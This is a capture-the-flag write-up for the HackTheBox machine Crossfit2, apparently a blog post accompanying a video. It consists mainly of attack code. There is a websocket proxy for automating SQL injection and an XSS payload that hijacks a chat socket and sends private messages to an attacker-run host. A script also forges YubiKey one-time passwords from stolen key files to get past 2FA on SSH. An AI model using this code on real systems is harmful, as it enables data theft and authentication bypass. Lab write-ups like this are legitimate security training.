---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/Ln40QxOacTI/0.jpg
layout: post
media_subpath: /assets/posts/2021-08-14-dns-rebinding-xss-2fa-ssh-crossfit2-hackthebox
tags:
- 2fa
- dns rebinding
- hackthebox
- openbsd
- sql injection
- xss
- yubikey
title: DNS Rebinding, XSS & 2FA SSH - Crossfit2 @ HackTheBox
---

We are solving Crossfit2, a 50-point OpenBSD machine on HackTheBox.

{% youtube Ln40QxOacTI %}

## Notes

**Websocket Proxy**

Author: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
import json
import ssl

ws_server = "ws://gym.crossfit.htb/ws/"

def send_ws(payload):
    ws = create_connection(ws_server)
    resp = ws.recv()
    token = json.loads(resp)['token']
    message = unquote(payload).replace('"','\'')
    data = '{"message":"available","params":"%s","token": "%s", "debug": 1}' % (message,token)
    print(data)
    ws.send(data)
    resp = ws.recv()
    #print(resp)
    ws.close()

    if resp:
        return resp
    else:
        return ''

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8080/?id=*")

try:
    middleware_server(('0.0.0.0',8080))
except KeyboardInterrupt:
    pass
```

**XSS**

password-reset.php

```html
<html>
<script src="http://crossfit-club.htb/socket.io/socket.io.js"></script>
<script src="http://xemployees.crossfit.htb/xct.js"></script>
</html>
```

xct.js

```js
function sendToMe(data) {
 var xhr = new XMLHttpRequest()
 xhr.open("GET","http://xemployees.crossfit.htb/?data="+data, false)
 xhr.withCredentials = true
 xhr.send()
}

socket = io("http://crossfit-club.htb")


socket.on("connect", () => {
  sendToMe("id " + socket.id) // true
  socket.emit("user_join",{username: "Admin"})
  socket.emit("global_message", {sender_id: socket.id, content: "my global msg", roomId: "global"})
  socket.emit("private_message", {sender_id: socket.id, content: "my private msg", roomId: 2})

});

socket.on("private_recv", e => {
        sendToMe("PRIVATE: " + JSON.stringify(e))
});

socket.on("recv_global", e => {
        sendToMe("Global: " + JSON.stringify(e))
});

socket.on("participants", e => {
        sendToMe("Participants: " + JSON.stringify(e))
});

socket.on("new_user", e => {
        sendToMe("New user: " + JSON.stringify(e))
});

socket.on("disconnect", e => {
        sendToMe("Disconnect: " + JSON.stringify(e))
});
```

**Yubikey**

Author: macz

```python
# Author: macz

from Crypto.Cipher import AES
from crccheck.crc import Crc16X25 # pip install crccheck
from pwn import *
from python_modhex.python_modhex import from_modhex, to_modhex # pip install python-modhex

key = unhex(open("root.key","r").read().strip())
kid = unhex(open("root.uid","r").read().strip())
ctr = int(open("root.ctr","r").read().strip())

ctr+= 0x100 # increment counter

with open('root.ctr', 'w') as f:
 f.write(str(ctr))

# struct: uid + counter + timestamp_L + timestamp_H + session_use + random + crc
struct = kid + p16(ctr >> 8) + b'\x12\x34' + b'\x56' + p8(ctr & 0xFF) + b'\xab\xcd'
struct += p16(Crc16X25.calc([_ for _ in struct]))

aes = AES.new(key, AES.MODE_ECB)

print("Your token: " + to_modhex(enhex(aes.encrypt(struct))))
```